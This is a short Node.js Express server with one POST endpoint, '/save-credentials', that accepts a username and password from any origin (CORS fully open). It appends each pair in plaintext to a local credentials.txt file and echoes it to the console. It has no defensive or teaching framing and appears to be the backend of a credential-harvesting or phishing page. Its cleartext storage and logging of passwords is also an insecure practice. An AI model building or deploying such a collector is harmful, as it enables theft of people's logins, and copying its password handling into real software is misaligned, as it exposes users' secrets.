const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = 4000;

// Middleware to parse JSON data
app.use(bodyParser.json());
app.use(cors());

// Endpoint to save credentials
app.post('/save-credentials', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required.');
    }

    const logEntry = `Username: ${username}, Password: ${password}\n`;

    // Append to a file
    fs.appendFile(path.join(__dirname, 'credentials.txt'), logEntry, (err) => {
        if (err) {
            console.error('Error saving credentials:', err);
            return res.status(500).send('Failed to save credentials.');
        }
        console.log('Credentials saved:', logEntry);
        res.status(200).send('Credentials saved successfully.');
    });
});

// Start the backend server
app.listen(PORT, () => {
    console.log(`Backend server running at http://localhost:${PORT}`);
});
